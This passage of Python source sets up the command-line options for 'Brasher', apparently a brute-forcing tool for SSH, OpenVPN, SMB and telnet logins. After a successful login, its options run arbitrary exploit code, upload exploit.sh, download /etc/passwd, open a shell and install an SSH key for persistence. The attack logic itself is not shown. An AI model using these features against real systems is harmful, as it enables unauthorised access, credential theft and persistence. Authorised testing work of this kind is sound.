    parser.add_argument("--min-length-password", type=int, help="Minimum password length to try")
    parser.add_argument("--max-length-password", type=int, help="Maximum password length to try")
    parser.add_argument("-nd","--no-duplicates", action="store_true", help="Remove duplicate entries from wordlists")
    parser.add_argument("-db","--delay-between", type=float, default=0, help="Delay between attempts on the same host (seconds)")
    parser.add_argument("-vf","-ovcf", "--open-vpn-config-file", type=str, help="This flag is used to specify the configuration file for connecting via OpenVPN. You can use it to bruteforce OpenVPN or to connect to the VPN itself. Specify the path to the configuration file. If you don't want to bruteforce OpenVPN but want to connect to it, be sure to include the --open-vpn-connect flag.") 
    parser.add_argument("-vu","-ovu", "--open-vpn-username", type=str, help="This flag is used to specify the username when connecting to OpenVPN or brute-forcing it. You can use it for both brute-forcing and connecting to the VPN itself. Specify the username. If you don't want to brute-force OpenVPN but want to connect to it, be sure to use the --open-vpn-connect flag.") 
    parser.add_argument("-vp","-ovp", "--open-vpn-password", type=str, help="This flag is used to specify a password when connecting to OpenVPN or brute-forcing it. You can use it both for brute-forcing and for the connection itself. Specify the password for access. If you don't want to brute-force OpenVPN but plan to connect to it, be sure to use the --open-vpn-connect flag.") 
    parser.add_argument("-vc","-ovc", "--open-vpn-connect", action="store_true", help="This flag is required to confirm the OpenVPN connection. If you've entered all the required login information, Brasher will attempt to register to establish a connection. This flag only serves as confirmation that you want to bruteforce via the VPN.") 
    parser.add_argument("-cw","-ovcfw", "--open-vpn-config-file-wordlist", type=str, help="This flag specifies the path to a file containing, in columns, target configuration files for testing private network login credentials. If you want to use only one configuration file, use the --open-vpn-config-file flag.") 
    parser.add_argument("-uw","-ovuw", "--open-vpn-usernames-wordlist", type=str, help="This flag specifies the path to a file containing usernames in a column for testing private network login credentials. If you want to use only one username, use the --open-vpn-username flag. The username value is equivalent to the --usernames-wordlist flag. You can also specify this flag if you prefer.") 
    parser.add_argument("-pw","-ovpw", "--open-vpn-passwords-wordlist", type=str, help="This flag specifies the path to a file containing a column of passwords for testing private network login credentials. If you want to use only one password, use the --open-vpn-password flag. The value of this password is equivalent to the --passwords-wordlist flag. You can also specify this flag if you prefer.") 
    parser.add_argument("-ex","--exploit", type=str, help="This flag is used to specify an exploit for arbitrary code execution by specifying the path to the target file, rather than using long one-liners with the -e flag. Specify arbitrary code to execute in the target file. Brasher will automatically read the file and execute the code. If you specify both the -e and --exploit flags, Brasher will only execute the --exploit.") 
    parser.add_argument("-uft", "--upload-file-to", type=str,help="Upload a local file to the remote server after successful authentication.The file will be placed in the specified remote path. Example: --upload-file ./exploit.sh /tmp/exploit.sh")
    parser.add_argument("-dft", "--download-file-to", type=str,help="Download a remote file from the server after successful authentication. The file will be saved to the local path.Example: --download-file /etc/passwd ./passwd.txt")
    parser.add_argument("-uff", "--upload-file-from", type=str,help="Upload a local file to the remote server after successful authentication.The file will be placed in the specified remote path. Example: --upload-file ./exploit.sh /tmp/exploit.sh")
    parser.add_argument("-dff", "--download-file-from", type=str,help="Download a remote file from the server after successful authentication. The file will be saved to the local path.Example: --download-file /etc/passwd ./passwd.txt")
    parser.add_argument("--shell", action="store_true",help="Open an interactive shell after successful authentication. Type 'exit' to close the session.")
    parser.add_argument("--persist", type=str, nargs='?', const="~/.ssh/id_rsa.pub",help="Install SSH key for persistent access. If no key is specified, Brasher will use ~/.ssh/id_rsa.pub. Example: --persist or --persist ~/.ssh/my_key.pub")
    parser.add_argument("-j","--jitter", type=float, default=0.0,help="Flag for adding a timeout to the current one. A negative timeout can be specified. Useful in combination with the --random-timeout flag.")
    parser.add_argument("-tp","--telnet-promt", type=str , default="$",help="This flag is used to specify your telnet prompt. The default value is '$', but if you have a different prompt, specify the one used on the machine being tested.") 
    parser.add_argument("--smb-client-name", type=str , default="SMBuser",help="This flag is used to specify the client name for an SMB connection. The default value is SMBuser, and specifying the flag is optional.") 
    parser.add_argument("--smb-server-name", type=str , default="SMBServer",help="This flag is used to specify the server name for an SMB connection. The default value is SMBServer, and specifying the flag is optional.")     
    parser.add_argument("--smb-share-name", type=str , default="share", help="This flag is used to specify the share name for an SMB connection. The default value is 'share' , and the flag is optional.")  
    parser.add_argument("--smb-remote-path", type=str , default="/", help="This flag is used to specify the return path for the SMB connection. The default value is '/', so specifying the flag is optional.")  
    parser.add_argument("--smb-domain", type=str , default="", help="This flag is used to specify the domain when connecting via SMB. The default value is '', and specifying the flag is optional. You should specify the domain if you require NTLM authentication or if you are on a private network where the domain must be explicitly defined.")  


    
    args = parser.parse_args()

    log_filename = None

    if args.output_file == "auto":  

        log_filename = f"./logs/{datetime.datetime.now().strftime('%d_%m_%Y_%H_%M_%S')}_logs.txt"

    elif args.output_file:  

        log_filename = args.output_file

    brasher = Brasher(

        target_host=args.host,
        passwords_list=args.passwords_list,
        usernames_list=args.usernames_list,
        single_password=args.single_password,
        single_username=args.single_username,
        timeout=args.timeout,
        threads=args.threads,
        progress_bar=args.progress_bar,
        no_progress_bar=args.no_progress_bar,
        port=args.port or 22,
        max_retries=args.max_retries,
        output_file=log_filename,
        no_log = args.no_log,
        max_time=args.max_time,
        mode=args.mode,
        log_mode=args.log_mode,
        stop_on_success=args.stop_on_success,
        socks5_address=args.socks5_address,
        socks5_port=args.socks5_port,
        socks5_username=args.socks5_username,
        socks5_password=args.socks5_password,
        hosts_list=args.hosts_list,
        no_color=args.no_color,
        ssh_key=args.ssh_key,
        keys_list=args.keys_list,
        random_timeout = args.random_timeout,
        host_timeout = args.host_timeout,
        ignore_errors = args.ignore_errors,
        success_only = args.success_only,
        delay=args.delay,
        shuffle_count=args.shuffle_count,
        shuffle_seeds_file=args.shuffle_seeds_file,
        shuffle_seed=args.seed,
        shuffle_usernames=args.shuffle_usernames,
        shuffle_passwords=args.shuffle_passwords,
        shuffle_configs=args.shuffle_configs,
        shuffle_keys=args.shuffle_keys,
        shuffle_hosts=args.shuffle_hosts,
        shuffle_seeds=args.shuffle_seeds,

        quiet=args.quiet,
        banner=args.banner,
        save_results=args.save_results,
        general_wordlist=args.general_wordlist,
        keep_open=args.keep_open,
        exec=args.exec,
        no_banner=args.no_banner,
        timer=args.timer,

        reverse_usernames=args.reverse_usernames,
        reverse_passwords=args.reverse_passwords,
        reverse_configs=args.reverse_configs,
        reverse_keys=args.reverse_keys,
        reverse_hosts=args.reverse_hosts,
        reverse_seeds=args.reverse_seeds,


        min_length_username = args.min_length_username,
        max_length_username = args.max_length_username,
        min_length_password = args.min_length_password,
        max_length_password = args.max_length_password,
        no_duplicates = args.no_duplicates,
        delay_between = args.delay_between,

        open_vpn_config_file=args.open_vpn_config_file,
        open_vpn_username=args.open_vpn_username,
        open_vpn_password=args.open_vpn_password,
        open_vpn_connect=args.open_vpn_connect,

        open_vpn_config_file_wordlist=args.open_vpn_config_file_wordlist,
        open_vpn_usernames_wordlist=args.open_vpn_usernames_wordlist,
        open_vpn_passwords_wordlist=args.open_vpn_passwords_wordlist,
        jitter=args.jitter,
        exploit=args.exploit,

        upload_file_to = args.upload_file_to,
        download_file_to = args.download_file_to,

        shell = args.shell,

        upload_file_from = args.upload_file_from,
        download_file_from = args.download_file_from,

        persist=args.persist,

        smb_client_name = args.smb_client_name,
        smb_server_name = args.smb_server_name,
        smb_share_name = args.smb_share_name,
        smb_remote_path = args.smb_remote_path,
        smb_domain = args.smb_domain,
        telnet_promt =  args.telnet_promt,


)
    brasher.main()
                                    


    
